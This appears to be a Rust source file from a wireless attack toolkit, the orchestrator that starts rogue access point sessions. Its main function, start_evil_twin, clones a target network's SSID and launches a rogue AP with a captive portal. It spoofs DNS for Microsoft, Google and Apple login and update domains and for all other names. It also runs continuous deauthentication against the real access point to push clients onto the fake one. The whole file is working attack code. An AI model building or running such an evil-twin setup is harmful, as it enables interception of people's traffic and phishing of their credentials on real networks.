//! Orchestrator module - start/stop modules

use crate::config::{Profile};
use crate::captive_portal::{PortalConfig, start_portal_with_config, stop_portal};
use crate::hostapd;
use crate::dns;
use crate::dhcp;
use crate::system_control;
use std::sync::{Mutex, OnceLock};
use std::collections::HashMap;
use std::fs;

static MODULES: OnceLock<Mutex<HashMap<String, bool>>> = OnceLock::new();

fn module_store() -> &'static Mutex<HashMap<String, bool>> {
    MODULES.get_or_init(|| Mutex::new(HashMap::new()))
}

pub fn start_module(name: &str) {
    let mut modules = module_store().lock().unwrap();
    modules.insert(name.to_string(), true);
    println!("module started: {}", name);
}

pub fn stop_module(name: &str) {
    let mut modules = module_store().lock().unwrap();
    modules.insert(name.to_string(), false);
    println!("module stopped: {}", name);
}

pub fn start_ap_session(iface: &str, profile: &Profile, portal_cfg: &PortalConfig, use_portal: bool) -> Result<(), String> {
    println!("Starting AP session on {} with profile {} (Portal: {})", iface, profile.name, use_portal);

    // 0. Prepara il sistema (Anti-interferenza)
    system_control::prepare_system_for_ap(iface)?;

    // 1. Scrive la config hostapd
    let hostapd_conf = hostapd::generate_hostapd_config(profile, iface);
    hostapd::write_hostapd_config(&hostapd_conf, "../system/runtime/hostapd.conf")?;

    // 2. Unified DNS + DHCP Config
    let mut dnsmasq_conf = format!(
        "interface={}\nbind-interfaces\nserver=8.8.8.8\nlog-queries\nlog-dhcp\n",
        iface
    );

    // DHCP part
    let ip_parts: Vec<&str> = portal_cfg.portal_ip.split('.').collect();
    if ip_parts.len() == 4 {
        let base_ip = format!("{}.{}.{}", ip_parts[0], ip_parts[1], ip_parts[2]);
        dnsmasq_conf.push_str(&format!("dhcp-range={}.10,{}.100,12h\n", base_ip, base_ip));
    } else {
        dnsmasq_conf.push_str("dhcp-range=192.168.50.10,192.168.50.100,12h\n");
    }
    dnsmasq_conf.push_str(&format!("dhcp-option=3,{}\ndhcp-option=6,{}\n", portal_cfg.portal_ip, portal_cfg.portal_ip));

    // DNS Spoofing part - Only if portal is enabled
    if use_portal {
        dnsmasq_conf.push_str(&format!("address=/update.microsoft.com/{}\n", portal_cfg.portal_ip));
        dnsmasq_conf.push_str(&format!("address=/connectivitycheck.gstatic.com/{}\n", portal_cfg.portal_ip));
        dnsmasq_conf.push_str(&format!("address=/appleid.apple.com/{}\n", portal_cfg.portal_ip));
        dnsmasq_conf.push_str(&format!("address=/#/{}\n", portal_cfg.portal_ip));
    }

    fs::write("../system/runtime/dnsmasq.conf", dnsmasq_conf).map_err(|e| e.to_string())?;

    // 4. Configura l'interfaccia
    if let Err(e) = system_control::configure_interface(iface, &portal_cfg.portal_ip, "24") {
        return Err(format!("Step 4 failed: {}", e));
    }

    // 5. Avvia hostapd
    if let Err(e) = hostapd::start_hostapd() {
        let _ = stop_ap_session(iface, portal_cfg);
        return Err(format!("Step 5 failed: {}", e));
    }

    // Wait a bit for the interface to be ready in Master mode
    std::thread::sleep(std::time::Duration::from_millis(1500));

    // 6. Avvia dnsmasq
    let _ = std::process::Command::new("pkill").arg("-x").arg("dnsmasq").output();

    let dnsmasq_log_path = "../system/runtime/logs/dnsmasq.log";
    if let Some(parent) = std::path::Path::new(dnsmasq_log_path).parent() {
        let _ = fs::create_dir_all(parent);
    }
    let dnsmasq_log = fs::File::create(dnsmasq_log_path).map_err(|e| e.to_string())?;
    let dnsmasq_status = std::process::Command::new("dnsmasq")
        .arg("-C")
        .arg("../system/runtime/dnsmasq.conf")
        .arg("-d")
        .stdout(dnsmasq_log.try_clone().map_err(|e| e.to_string())?)
        .stderr(dnsmasq_log)
        .spawn();

    if dnsmasq_status.is_err() {
        let _ = stop_ap_session(iface, portal_cfg);
        return Err("Step 6 failed: Failed to start dnsmasq".to_string());
    }

    // 7. Applica iptables - Redirect only if portal is enabled
    if use_portal {
        if let Err(e) = system_control::apply_firewall_rules(iface, &portal_cfg.portal_ip) {
            let _ = stop_ap_session(iface, portal_cfg);
            return Err(format!("Step 7 failed: {}", e));
        }

        // 8. Avvia il captive portal
        stop_portal(); // Ensure port is free
        start_portal_with_config(portal_cfg.clone());
    } else {
        // Basic NAT for real internet if portal is disabled
        let _ = system_control::run_command("iptables", &["-t", "nat", "-A", "POSTROUTING", "-j", "MASQUERADE"]);
    }

    // 9. Monitor hostapd for clients
    start_client_monitor();

    start_module("ap_session");
    Ok(())
}

fn start_client_monitor() {
    std::thread::spawn(|| {
        use std::io::{BufRead, BufReader, Seek};
        use std::fs::File;
        use crate::event_bus;

        let log_path = "../system/runtime/logs/hostapd.log";
        // Wait for file to exist
        for _ in 0..10 {
            if fs::metadata(log_path).is_ok() { break; }
            std::thread::sleep(std::time::Duration::from_millis(500));
        }

        let file = match File::open(log_path) {
            Ok(f) => f,
            Err(_) => return,
        };
        let mut reader = BufReader::new(file);
        // Seek to end
        let _ = reader.seek(std::io::SeekFrom::End(0));

        loop {
            if !is_module_active("ap_session") { break; }
            let mut line = String::new();
            if let Ok(n) = reader.read_line(&mut line) {
                if n > 0 {
                    if line.contains("associated") || line.contains("authenticated") {
                         if let Some(mac) = extract_mac(&line) {
                             let msg = format!("[+] Client connected: {}", mac);
                             println!("{}", msg);
                             event_bus::emit(&msg);
                         }
                    } else if line.contains("deauthenticated") || line.contains("disassociated") {
                         if let Some(mac) = extract_mac(&line) {
                             let msg = format!("[-] Client disconnected: {}", mac);
                             println!("{}", msg);
                             event_bus::emit(&msg);
                         }
                    }
                } else {
                    std::thread::sleep(std::time::Duration::from_millis(500));
                }
            } else {
                break;
            }
        }
    });
}

fn extract_mac(line: &str) -> Option<String> {
    // Example: wlan0: STA 00:11:22:33:44:55 IEEE 802.11: associated
    let parts: Vec<&str> = line.split_whitespace().collect();
    for i in 0..parts.len() {
        if parts[i] == "STA" && i + 1 < parts.len() {
            return Some(parts[i+1].to_string());
        }
    }
    None
}

pub fn stop_ap_session(iface: &str, portal_cfg: &PortalConfig) -> Result<(), String> {
    println!("Stopping AP session on {}", iface);

    stop_portal();
    let _ = system_control::clear_firewall_rules(iface, &portal_cfg.portal_ip);
    let _ = dns::stop_dns();
    let _ = hostapd::stop_hostapd();
    let _ = dhcp::stop_dhcp();
    let _ = system_control::restore_system_after_ap(iface);

    stop_module("ap_session");
    Ok(())
}

pub fn start_evil_twin(iface: &str, target_ssid: &str, portal_cfg: &PortalConfig) -> Result<(), String> {
    println!("Starting Automatic Evil Twin for SSID: {}", target_ssid);

    // 1. Scan for the target
    let networks = crate::recon::scan_targets(iface);
    let target = networks.iter().find(|n| n.ssid == target_ssid)
        .ok_or_else(|| format!("Target SSID '{}' not found in scan", target_ssid))?;

    println!("Found target: {} ({}) on channel {}", target.ssid, target.bssid, target.channel);

    // 2. Clone the profile
    let cloned_profile = crate::recon::profile_from_network(target);

    // 3. Start the AP session
    start_ap_session(iface, &cloned_profile, portal_cfg, true)?;

    // 4. Start deauth in background to force clients to disconnect from the real AP
    let iface_clone = iface.to_string();
    let bssid_clone = target.bssid.clone();
    std::thread::spawn(move || {
        println!("Launching background deauth against {}...", bssid_clone);
        loop {
            if !is_module_active("ap_session") { break; }
            let _ = crate::deauth::deauth_all(&iface_clone, &bssid_clone);
            std::thread::sleep(std::time::Duration::from_secs(30));
        }
    });

    Ok(())
}

fn is_module_active(name: &str) -> bool {
    let modules = module_store().lock().unwrap();
    *modules.get(name).unwrap_or(&false)
}

pub fn list_modules() {
    let modules = module_store().lock().unwrap();
    for (name, active) in modules.iter() {
        println!("{}: {}", name, if *active { "running" } else { "stopped" });
    }
}
